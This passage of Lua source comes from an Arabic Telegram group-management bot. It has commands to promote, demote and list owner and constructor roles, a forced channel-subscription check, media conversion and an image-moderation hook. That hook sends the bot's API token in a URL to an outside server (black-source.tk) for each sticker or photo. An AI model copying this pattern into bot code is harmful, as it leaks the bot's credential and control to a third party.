database:srem(bot_id..'Sudo:User', userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من المطورين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false 
end
if text == ("مسح قائمه الملوك") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ♤ تم مسح قائمه الملوك')
return false
end

if text == 'قائمه الملوك' and Sudo(msg) then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n ♤ قائمه الملوك\n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد احد في قائمه الملوك"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("صيح للمالك") or text == ("تاك للمالك") then
local list = database:smembers(bot_id..'CoSu'..msg.chat_id_)
t = "\n ♤ وينكم تعالو يريدوكم بالجروب \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد احد في قائمه المالك"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع الملوك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته الملوك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع الملوك@(.*)$") and Sudo(msg) then
local username = text:match("^رفع الملوك@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم ترقيته الملوك'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع الملوك(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع الملوك(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم ترقيته الملوك'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم ترقيته الملوك'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل الملوك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الملوك'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل الملوك@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل الملوك@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n ♤ الـعـضو   ⇦♤['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الملوك'
texts = usertext..status
else
texts = ' ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل الملوك(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل الملوك(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤ لا تستطيع استخدام البوت \n ♤  يرجى الاشتراك بالقناه اولا \n ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ♤ الـعـضو   ⇦♤['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n ♤ تم تنزيله من الملوك'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ♤ الـعـضو   ⇦♤'..userid..''
status  = '\n ♤ تم تنزيله من الملوك'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------

if (msg.content_.sticker_)  and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then      
sticker_id = msg.content_.sticker_.sticker_.persistent_id_
st = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..sticker_id.."&type=sticker")
eker = JSON.decode(st)
if eker.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = " ♤ المنشئين الاساسين تعالو مخرب \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply"," ♤ قام بنشر ملصق اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
if (msg.content_.photo_) and msg.reply_to_message_id_ == 0 and database:get(bot_id.."lock:Lock:Sexy"..msg.chat_id_)=="del" then
photo_id = msg.content_.photo_.sizes_[1].photo_.persistent_id_  
Srrt = https.request('https://black-source.tk/BlackTeAM/ImageInfo.php?token='..token..'&url='..photo_id.."&type=photo")
Sto = JSON.decode(Srrt)
if Sto.ok.Info == "Indecent" then
local list = database:smembers(bot_id.."Basic:Constructor"..msg.chat_id_)
t = " ♤ المنشئين الاساسين تعالو مخرب \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply"," ♤ قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end

if text == ("رفع مالك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• لا تستطيع استخدام البوت \n•  يرجى الاشتراك بالقناه اولا \n•  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n♤ العضو ✓ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n♤ تم ترقيته مالك\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع مالك@(.*)$") and Sudo(msg) then
local username = text:match("^رفع مالك@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• لا تستطيع استخدام البوت \n•  يرجى الاشتراك بالقناه اولا \n•  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"• عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n♤ العضو ✓ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n♤ تم ترقيته مالك\n'
texts = usertext..status
else
texts = '♤ لا يوجد حساب بهاذا المعرف\n'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع مالك(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع مالك(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• لا تستطيع استخدام البوت \n•  يرجى الاشتراك بالقناه اولا \n•  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n♤ العضو ✓ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n♤ تم ترقيته مالك\n'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n♤ العضو ✓ '..userid..''
status  = '\n♤ تم ترقيته مالك\n'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل مالك") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• لا تستطيع استخدام البوت \n•  يرجى الاشتراك بالقناه اولا \n•  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n♤ العضو ✓ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n♤ تم تنزيله من مالك لعضو\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل مالك@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• لا تستطيع استخدام البوت \n•  يرجى الاشتراك بالقناه اولا \n•  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'CoSu'..msg.chat_id_, result.id_)
usertext = '\n♤ العضو ✓ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n♤ تم تنزيله من مالك لعضو\n'
texts = usertext..status
else
texts = '• لا يوجد حساب بهاذا المعرف\n'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل مالك(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل مالك(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'• لا تستطيع استخدام البوت \n•  يرجى الاشتراك بالقناه اولا \n•  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'CoSu'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n♤ العضو ✓ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n♤ تم تنزيله من مالك لعضو حقير\n'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n• العضو ✓ '..userid..''
status  = '\n• تم تنزيله من مالك لعضو\n'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == 'تفعيل التحويل' and CoSu(msg) then   
if database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
Text = 'تم تفعيل تحويل الصيغ'
database:del(bot_id..'DRAGOON:change:sofi'..msg.chat_id_)  
else
Text = ' ♤ بالتاكيد تم تفعيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التحويل' and CoSu(msg) then  
if not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then
database:set(bot_id..'DRAGOON:change:sofi'..msg.chat_id_,true)  
Text = '\n ♤ تم تعطيل امر تحويل'
else
Text = '\n ♤ بالتاكيد تم تعطيل امر تحويل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.photo_ then 
local pn = result.content_.photo_.sizes_[1].photo_.persistent_id_
Addsticker(msg,msg.chat_id_,pn,msg.sender_user_id_..'.png')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end

if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.voice_ then 
local mr = result.content_.voice_.voice_.persistent_id_ 
Addmp3(msg,msg.chat_id_,mr,msg.sender_user_id_..'.mp3')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.audio_ then 
local mr = result.content_.audio_.audio_.persistent_id_
Addvoi(msg,msg.chat_id_,mr,msg.sender_user_id_..'.ogg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'تحويل' and not database:get(bot_id..'DRAGOON:change:sofi'..msg.chat_id_) then  
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.sticker_ then 
local Str = result.content_.sticker_.sticker_.persistent_id_ 
Addjpg(msg,msg.chat_id_,Str,msg.sender_user_id_..'.jpg')
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end

-------------------
------------------------------------------------------------------------
if text == ("مسح الاساسين") and CoSu(msg) then
database:del(bot_id..'Basic:Constructor'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ♤ تم مسح المنشئين الاساسين')
return false
end
if text == 'المنشئين الاساسين' and CoSu(msg) then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n ♤ قائمة المنشئين الاساسين \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
return false
end
if text == ("تاك للمنشئين الاساسين") or text == ("صيح المنشئين الاساسين") then
local list = database:smembers(bot_id..'Basic:Constructor'..msg.chat_id_)
t = "\n ♤ وينكم تعالو يريدوكم بالجروب \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد منشئين اساسين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("رفع منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  ♤ لا تستطيع استخدام البوت \n  ♤  يرجى الاشتراك بالقناه اولا \n  ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  ♤ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  ♤ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^رفع منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  ♤ لا تستطيع استخدام البوت \n  ♤  يرجى الاشتراك بالقناه اولا \n  ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"  ♤ عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n  ♤ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n  ♤ تم ترقيته منشئ اساسي'
texts = usertext..status
else
texts = '  ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^رفع منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^رفع منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  ♤ لا تستطيع استخدام البوت \n  ♤  يرجى الاشتراك بالقناه اولا \n  ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:sadd(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n  ♤ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  ♤ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n  ♤ الـعـضو   ⇇'..userid..''
status  = '\n  ♤ تم ترقيته منشئ اساسي'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
if text == ("تنزيل منشئ اساسي") and msg.reply_to_message_id_ and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  ♤ لا تستطيع استخدام البوت \n  ♤  يرجى الاشتراك بالقناه اولا \n  ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  ♤ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  ♤ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي @(.*)$") and CoSu(msg) then
local username = text:match("^تنزيل منشئ اساسي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  ♤ لا تستطيع استخدام البوت \n  ♤  يرجى الاشتراك بالقناه اولا \n  ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
function start_function(extra, result, success)
if result.id_ then
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, result.id_)
usertext = '\n  ♤ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n  ♤ تم تنزيله من الاساسيين'
texts = usertext..status
else
texts = '  ♤ لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match("^تنزيل منشئ اساسي (%d+)$") and CoSu(msg) then
local userid = text:match("^تنزيل منشئ اساسي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,'  ♤ لا تستطيع استخدام البوت \n  ♤  يرجى الاشتراك بالقناه اولا \n  ♤  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n  ♤ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  ♤ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n  ♤ الـعـضو   ⇇'..userid..''
status  = '\n  ♤ تم تنزيله من الاساسيين'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المنشئين' and BasicConstructor(msg) then
database:del(bot_id..'Constructor'..msg.chat_id_)
texts = ' ♤ تم مسح المنشئين '
send(msg.chat_id_, msg.id_, texts)
end

if text == ("المنشئين") and BasicConstructor(msg) then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ♤ قائمة المنشئين \n⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("تاك للمنشئين") or text == ("صيح المنشئين") then
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ♤ وينكم تعالو يريدوكم بالجروب \n⩹━━━⊶❲𝗘𝗟𝗠??𝗢𝗞❳⊷━━━⩺\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- {[@"..username.."]}\n"
else
t = t..""..k.."- ♤ '..v..' ♤\n"
end
end
if #list == 0 then
t = " ♤ لا يوجد منشئين"
end
send(msg.chat_id_, msg.id_, t)
end
if text ==("المنشئ") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_," ♤  حساب المنشئ محذوف")
return false  
end
if b.username_ then
UserName = b.username_
else
UserName = 'eLmLoK0'
end
local Text = "*منشئ الجروب ⇐* ["..b.first_name_.."](tg://user?id="..b.id_..")\n"..getbio(b.id_):gsub('لايوجد','')
local msg_id = msg.id_/2097152/0.5
keyboard = {} 
keyboard.inline_keyboard = {
{{text ='♤ '..b.first_name_..'♤', url="t.me/"..UserName}},   
{{text = 'أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
